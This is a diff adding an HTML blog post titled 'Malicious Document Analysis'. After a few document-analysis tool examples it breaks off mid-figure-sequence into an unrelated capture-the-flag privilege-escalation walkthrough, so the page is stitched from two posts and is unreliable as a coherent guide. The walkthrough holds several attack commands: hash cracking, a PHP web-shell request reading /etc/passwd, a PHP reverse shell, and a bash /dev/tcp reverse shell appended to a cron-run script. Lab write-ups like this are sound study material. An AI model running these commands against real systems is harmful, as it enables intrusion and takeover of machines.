@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-10C9B08WGE"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+    
+        gtag('config', 'G-10C9B08WGE');
+    </script>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="description" content="Cyber Security Engineer">
+    <meta name="author" content="Samuel Kwaku Addison">
+
+    <meta property="og:site_name" content="Samuel K. Addison | Cyber Security Engineer " />
+    <meta property="og:title" content="Malicious Document Analysis" />
+    <meta property="og:description" content="Cyber Security Engineer writes about Linux Privilege Escalation " />
+    <meta property="og:image" content="https://github.com/SamAddy/samaddy.github.io/blob/main/Blog/Images/anchorblog.png?raw=true" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://samaddy.github.io/Blog/malicious-document-analysis.html">
+
+
+    <title>Malicious Document Analysis | Samuel K. Addison - Cyber Security Engineer</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,600;0,700;1,400&family=Poppins:wght@600&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://kit.fontawesome.com/997d814be9.css" crossorigin="anonymous">
+    <link href="https://getbootstrap.com/docs/5.2/assets/css/docs.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-okaidia.min.css" rel="stylesheet" />
+ 
+
+    <link href="css/style.css" rel="stylesheet">
+
+    <link rel="icon" href="/images/favicon.png">
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://kit.fontawesome.com/997d814be9.js" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+    
+
+    <!-- <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const currentLocation = location.href;
+            const navLinks = document.querySelectorAll('.nav-link');
+            navLinks.forEach(link => {
+            if (link.href === currentLocation) {
+                link.classList.add('current');
+            }
+            });
+        });
+    </script> -->
+
+    <!-- Google tag (gtag.js) -->
+    
+
+    <style>
+        body {
+            background: #130a3f;
+            font-family: 'Open Sans', Helvetica, sans-serif;
+            color: #7E7E7E;
+        }
+
+        h1 {
+            color: #fff;
+            font-weight: 900;
+            font-size: 2.2rem;
+            line-height: 3.25rem;
+            font-family: 'inter', sans-serif;
+            margin-top: 1.5rem;
+            text-decoration: none;
+            text-align: center;
+        }
+
+        .nav a:link {
+            color: #fff;
+        }
+
+        .nav a:hover, a:active{
+            color: #fff;
+            text-decoration: underline;
+            text-underline-offset: 3px;
+        }
+
+        .container-fluid a:hover {
+            text-decoration: none;
+        }
+
+        .nav-link{
+            color: #fff;
+        }
+
+        .active {
+            text-decoration: underline;
+            text-underline-offset: 3px;
+        }
+        
+        .container-fluid h1 {
+            margin-top: 2.0rem;
+            font-family: "inter", sans-serif;
+            font-size: 32px;
+        }
+
+        /* blog styling */
+        .blog h2, h4 {
+            font-weight: 400;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            color: #08a0e9;
+        }
+        .content p {
+            color: #ffff;
+        }
+
+        .copy-code {
+            position: absolute;
+        /*  top: 0; */
+        /*  right: 0; */
+            cursor: pointer;
+        }
+
+
+        /* socials and copyright */
+        .socials-copyright {
+            /* display: flex; */
+            padding-top: 5rem;
+            text-align: center;
+            bottom: 0;
+            right: 0;
+            width: 100%;
+        }
+
+        .social-container a {
+            text-decoration: none;
+            color: #fff;
+        }
+
+        .social-container a:hover {
+            text-decoration: none;
+        }
+
+        .fa-twitter {
+            color: #08a0e9;
+        }
+
+        .fa-youtube {
+            color: #FF0000;
+        }
+
+        .p-small {
+            margin-top: 10px;
+            color: #fff;
+            font-size: 15px;
+        }
+
+        time {
+            text-align: center;
+
+        }
+        
+        article {
+        position: relative;
+        padding: 20px;
+        z-index: 2;
+
+        max-width:calc(100vw - 4rem);
+        width:60rem;
+        margin:0 auto
+        }
+
+        .caption {
+            text-align: center;
+        }
+
+        .caption time {
+            font-size: small;
+        }
+
+        .blog li {
+            color: #fff;
+        }
+
+        .screenshot {
+            text-align: center;
+            padding-top: 10px;
+            padding-bottom: 10px;
+        }
+
+       
+        @media screen and (max-width: 780px) {
+            article {
+                max-width:100%;
+                margin:0 auto
+            }
+            code {
+                max-width: 100%;
+            }
+            .screenshot img {
+                max-width: 100%;
+            }
+            .contact-container {
+                margin-left: 15px;
+                margin-right: 15px;
+            }
+
+            .p-small {
+                margin-top: 0px;
+            } 
+        }
+
+    </style>
+</head>
+<body data-spy="scroll" data-target=".fixed-top">
+    <section>
+        <div class="container-fluid">
+            <h1><a class="navbar-brand" href="https://samaddy.github.io/">Samuel K. Addison</a></h1>
+        </div>
+        <div class="container">
+            <ul class="nav justify-content-center">
+                <li class="nav-item">
+                  <a class="nav-link" href="https://samaddy.github.io/">Home</a>
+                </li>
+                <li class="nav-item">
+                  <a class="nav-link" href="https://samaddy.github.io/Projects/projects.html">Projects</a>
+                </li>
+                <li class="nav-item">
+                  <a class="nav-link active" aria-current="page" href="https://samaddy.github.io/Blog/blog.html">Blog</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="https://samaddy.github.io/contact.html">Contact</a>
+                  </li>
+              </ul>
+        </div>
+    </section>
+
+    <article class="blog">
+        <div class="caption">
+            <time datetime="2023-03-13">Tuesday, April 11, 2023</time>
+            <h1>Malicious Document Analysis</h1>
+        </div>
+    
+        <div class="content">
+            <p>
+                Malicious documents are a common vector for malware attacks. They can be disguised as harmless files, such as Microsoft Office documents or PDFs, and can contain hidden scripts or macros that execute when opened. Analyzing malicious documents is an important part of cybersecurity, as it can help identify and prevent potential threats. In this blog post, we'll explore some tips and tools for static analysis of malicious documents.
+            </p>
+            <p>
+                Malware authors often use obfuscation techniques to hide malicious code within documents. One common technique is to encode the code using 
+                <a href="https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/character-set-0127" target="_blank" rel="noopener noreferrer">ASCII character codes</a>. Understanding how ASCII character codes work can help you decode obfuscated code and identify any hidden commands or payloads.
+            </p>
+            
+            <h2>Tools for Malicious Document Analysis</h2>
+            <p>
+                There are a variety of tools available for static analysis of malicious documents. Here are some of the most commonly used ones, along with examples of commands:
+            </p>
+
+            <h4>
+                Strings
+            </h4>
+            <p>
+                Strings is a Linux command-line tool that extracts all ASCII and Unicode strings from a file. This can be useful for identifying any suspicious strings, such as shellcode or encoded commands. Here's an example command:
+            </p>
+    
+            <div class="code-snippet">
+                <div class="copy-code">&#x1F4CB;</div>
+                <pre><code class="language-bash" data-clipboard-text='strings malicious_document_name.docx'>
+                strings malicious_document_name.docx
+                </code></pre>
+            </div>
+
+            <h4>Exiftool</h4>
+            <p>
+                Exiftool is a tool that extracts metadata from a file, such as embedded scripts or links. Here's an example command:
+            </p>
+            <div class="code-snippet">
+                <div class="copy-code">&#x1F4CB;</div>
+                <pre><code class="language-bash" data-clipboard-text='exiftool malicious_document_name.docx'>
+                exiftool malicious_document_name.docx
+                </code></pre>
+            </div>
+
+            <h4>Xorsearch</h4>
+            <p>
+                Xorsearch is a tool that searches for XOR-encoded strings within a file. This can be useful for identifying any obfuscated commands or payloads. Here's an example command:
+            </p>
+            <div class="code-snippet">
+                <div class="copy-code">&#x1F4CB;</div>
+                <pre><code class="language-bash" data-clipboard-text='exiftool malicious_document_name.docx'>
+                    xorsearch -s "some_encoded_string" malicious_document_name.docx
+                </code></pre>
+            </div>
+
+
+            <div class="screenshot">
+                <img src="Images/services.png" alt="nmap result">
+                <p>Figure 2 - Running services </p>
+            </div>
+
+            <h2>Enumerate Web Application and ftp</h2>
+            <p>
+                From the reconnaissance, we have identified that the target is running an ftp server and web application.
+                We can probe the FTP server to see what's on it. We can log in anonymously as anonymous login is allowed on the FTP server. 
+                From our Nmap scan, we also noticed a file called "note.txt" on the FTP server. We can log in and download the file to our local machine to view its content as follows:
+            </p>
+            <div class="code-snippet">
+                <div class="copy-code">&#x1F4CB;</div>
+                <pre><code class="language-bash" data-clipboard-text='ftp 192.168.1.211
+                    get note.txt'>
+                    ftp 192.168.1.211
+                    get note.txt
+                </code></pre>
+            </div>
+
+            <div class="screenshot">
+                <img src="Images/ftp_1.png" alt="nmap result">
+                <p>Figure 3 - ftp login </p>
+            </div>
+            <div class="screenshot">
+                <img src="Images/ftp_get.png" alt="nmap result">
+                <p>Figure 4 - ftp login </p>
+            </div>
+
+            <div class="screenshot">
+                <img src="Images/note.png" alt="nmap result">
+                <p>Figure 5 - note.txt content </p>
+            </div>
+
+            <p>
+                In the content of the note.txt file, we find a hashed password. We can crack the hashed password with hashcat 
+                or online tool like <a href="https://hashes.com/en/decrypt/hash" target="_blank" rel="noopener noreferrer">Hashes</a>. 
+                When cracking with hashcat, we need to know the hash type of 
+                <code>cd73502828457d15655bbd7a63fb0bc8</code>, which we determine to be MD5 by checking online.
+                The cracked hash result in student, so we now have <code>login: 10201321</code> and <code>password: student</code>.
+            </p>
+
+            <div class="code-snippet">
+                <div class="copy-code">&#x1F4CB;</div>
+                <pre><code class="language-bash" data-clipboard-text='hashcat -a 0  -m 0 hash.txt /usr/share/wordlists/rockyou.txt'>
+                    hashcat -a 0  -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+                </code></pre>
+            </div>
+
+            <p>
+                We need to identify the URL of the login page for the web application and any other pages that may be useful for our attack. 
+                We can use tools such as Dirb or Gobuster to enumerate the web application:
+            </p>
+            <div class="code-snippet">
+                <div class="copy-code">&#x1F4CB;</div>
+                <pre><code class="language-bash" data-clipboard-text='gobuster dir -u http://192.168.1.211/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt'>
+                gobuster dir -u http://192.168.1.211/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+                </code></pre>
+            </div>
+
+            <div class="screenshot">
+                <img src="Images/gobuster.png" alt="nmap result">
+                <p>Figure 6 - Gobuster </p>
+            </div>
+
+            <p>
+                We can now log into http://192.168.1.211/academy/ since we have the login from our prior exploit. 
+                Yes we are now in the web application and can exploit it's features. We can see the choice to browse 
+                and upload a new photo when we look through the web app's features. Seeing that the system was a php one, 
+                we could upload a php backdoor file to enable us get command line access. 
+            </p>
+
+            <div class="screenshot">
+                <img src="Images/profile.png" alt="nmap result">
+                <p>Figure 7 - Profile upload </p>
+            </div>
+
+            <div class="screenshot">
+                <img src="Images/backdoor.png" alt="nmap result">
+                <p>Figure 8 - Backdoor </p>
+            </div>
+            
+            <p>
+                By inspecting the page after the upload, we could see the path to the file is <code>studentphoto/user7.php</code>.
+                Since our backdoor is in there, then I proceeded to use that to view sensitive files. At the time on uploading my backdoor, 
+                this is the list that I got. The command used: <code>http://192.168.1.211/academy/studentphoto/user7.php?cmd=ls</code>. 
+                I also got to view the passwd file to know which users are present on the system for escalation. 
+                This is how the modification of the url looks like: <code>http://192.168.1.211/academy/studentphoto/user7.php?cmd=cat%20/etc/passwd</code>.
+            </p>
+
+            <div class="screenshot">
+                <img src="Images/passwd.png" alt="nmap result">
+                <p>Figure 9 - Passwd file </p>
+            </div>
+    
+            <h2>Horizontal Escalation</h2>
+            <p>
+                Seeing that our backdoor is working fine, we can proceed craft a payload to help get a reverse shell for further privilege escalation:
+            </p>
+
+            <div class="code-snippet">
+                <div class="copy-code">&#x1F4CB;</div>
+                <pre><code class="language-bash" data-clipboard-text=' '>
+                    php -r '$sock=fsockopen("192.168.1.7",6996);$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' 
+                </code></pre>
+            </div>
+
+            <p>
+                We can then listen for the shell in a different terminal with the command:
+            </p>
+            <div class="code-snippet">
+                <div class="copy-code">&#x1F4CB;</div>
+                <pre><code class="language-bash" data-clipboard-text='nc -nlvp 6996'>
+                    nc -nlvp 6996 
+                </code></pre>
+            </div>
+            
+            <p>
+                Even though we are not seeing the shell prompt, we could see the banner which makes us know that we are connected.
+            </p>
+
+            <div class="screenshot">
+                <img src="Images/shell.png" alt="nmap result">
+                <p>Figure 10 - Reverse shell </p>
+            </div>
+
+            <p>
+                While exploring user www-data, when we navigate to the user's <code>/</code> directory, we can find another home directory which contained 
+                another directory for the user grimmie which was seen in /etc/passwd file as shown in Figure 9. 
+                In this directory, we will find a backup.sh file which has quite some information pointing to something important. 
+                When we navigate to the path provided in backup.sh, we will find some sensitive information in the config.php file. 
+            </p>
+
+            <div class="screenshot">
+                <img src="Images/backup.png" alt="nmap result">
+                <p>Figure 11 - Backup content </p>
+            </div>
+
+            <div class="screenshot">
+                <img src="Images/config.png" alt="nmap result">
+                <p>Figure 12 - Config file </p>
+            </div>
+
+            <p>
+                Having obtained the credentials for user grimmie, we can switch user and try to escalate to get access to the flag.
+                The system doesn't seem to have much options that we may take advantage of but good enough there's the possiblity to 
+                use crontab. Crontab can be viewed with the command <code>cat /etc/crontab</code>.
+            </p>
+
+            <div class="screenshot">
+                <img src="Images/crontab.png" alt="nmap result">
+                <p>Figure 13 - Crontab</p>
+            </div>
+
+            <p>
+                Haven seee the content of backup.sh, we can use bash tcp reverse shell to get privilege escalation.
+                We will <code>echo bash -i >& /dev/tcp/192.168.1.7/8081 0>&1 >> /home/grimmie/backup.sh</code> and 
+                listen on a different terminal with <code>nc -nlvp 8081</code>. After echoing into backup.sh file, 
+                we can run <code>./backup.sh</code>
+            </p>
+
+            <div class="screenshot">
+                <img src="Images/bash.png" alt="nmap result">
+                <p>Figure 14 - bash</p>
+            </div>
+
+            <div class="screenshot">
+                <img src="Images/flag.png" alt="nmap result">
+                <p>Figure 15 - Flag</p>
+            </div>
+
+            <p>Flag: <code>Congratz you rooted this box!</code></p>
+            
+
+            <h2>Conclusion</h2>
+            
+            <p>
+                Privilege escalation is a serious threat to the security of a Linux system. It can be achieved through a variety of methods, 
+                including exploiting vulnerabilities, using brute-force attacks, and exploiting misconfigured permissions. 
+                To prevent privilege escalation, it is important to implement strong security measures, such as using strong passwords, keeping 
+                the system up-to-date with the latest security patches, and monitoring the system for suspicious activity. By following these best practices, 
+                you can help to protect your Linux system from the threat of privilege escalation.
+            </p>
+
+        </div>
+    
+    </article>
+
+    <section class="socials-copyright">
+        <div class="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-12">
+                        <div class="social-container">
+                            <span class="fa-stack">
+                                <a href="https://github.com/SamAddy">
+                                    <i class="fab fa-github fa-stack-1x"></i>
+                                </a>
+                            </span>
+                            <span class="fa-stack">
+                                <a href="https://www.linkedin.com/in/samuel-k-addison/">
+                                    <i class="fa-brands fa-linkedin-in fa-stack-1x"></i>
+                                </a>
+                            </span>
+                            <span class="fa-stack">
+                                <a href="https://twitter.com/Prof_Addy">
+                                    <i class="fa-brands fa-twitter fa-stack-1x"></i>
+                                </a>
+                            </span>
+                            <span class="fa-stack">
+                                <a href="https://www.youtube.com/@profaddy">
+                                    <i class="fa-brands fa-youtube fa-stack-1x"></i>
+                                </a>
+                            </span>
+                        </div> 
+                    </div> 
+                </div> 
+            </div> 
+        </div> 
+
+
+         <div class="copyright">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-12">
+                        <p class="p-small">© <script>document.write(new Date().getFullYear())</script> - SamAddy</p>
+                    </div> 
+                </div> 
+            </div> 
+        </div> 
+    </section>
+
+
+
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.14.7/dist/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/autoloader/prism-autoloader.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</body>
+</html>
